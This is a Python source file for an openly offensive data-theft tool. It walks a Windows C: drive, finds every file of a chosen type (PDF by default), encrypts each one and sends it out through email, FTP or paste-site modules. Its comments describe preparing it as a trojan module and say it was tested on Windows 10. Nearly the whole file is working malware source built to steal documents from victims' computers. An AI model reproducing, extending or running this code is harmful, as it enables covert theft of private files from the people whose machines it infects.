'''
This script is the tool that applies the functions defined in the other exfil files. 
This tool searches the file system, identifies all files of a given type, and exfiltrates them via the specified method.
'''

'''
EDITS: prior to deployment this code needs to be integrated as a trojan module. That means 2 things:
    1. Missing dependencies need to be handled during runtime and should not result in Exceptions (see trojan source and other modules).
    2. The code needs to be formatted such that an entry point is provided via a run() function.
'''

# This code was successfully tested on Windows 10 Pro Build 19045

from cryptor import encrypt, decrypt
from email_exfil import outlook, plain_email
from transmit_exfil import plain_ftp, transmit
from paste_exfil import ie_paste, plain_paste

import os

EXFIL = {                           # dictionary dispatch
    'outlook': outlook,
    'plain_email': plain_email,
    'plain_ftp': plain_ftp,
    'transmit': transmit,
    'ie_paste': ie_paste,
    'plain_paste': plain_paste,
}

def find_docs(doc_type='.pdf'):                         # walk the file system and yeild every file of a given type; this function creates a generator object
    for parent, _, filenames in os.walk('c:\\'):
        for filename in filenames:
            if filename.endswith(doc_type):
                document_path = os.path.join(parent, filename)
                yield document_path

def exfiltrate(document_path, method):                  # takes in the path to the target document and the method by which to exfiltrate the target
    if method in ['transmit', 'plain_ftp']:                                 # if the transmission will involve a file transfer...
        filename = f'c:\\windows\\temp\\{os.path.basename(document_path)}'
        with open(document_path, 'rb') as f0:
            contents = f0.read()
        with open(filename, 'wb') as f1:                                        # an encrypted copy of the file is made prior to transmission
            f1.write(encrypt(contents))

        EXFIL[method](filename)                                         # exfiltrate the encrypted copy of the target file
        os.unlink(filename)                                             # remove the encrypted copy of the file
    else:                                               # if the exfiltration does not involve a file transfer...
        with open(document_path, 'rb') as f:
            contents = f.read()                             # read the contents of the target file
        title = os.path.basename(document_path)
        contents = encrypt(contents)
        EXFIL[method](title, contents)                      # exfiltrate the file as an encrypted encoded string using the selected method 

if __name__ == "__main__":
    for fpath in find_docs():
        exfiltrate(fpath, 'plain_email')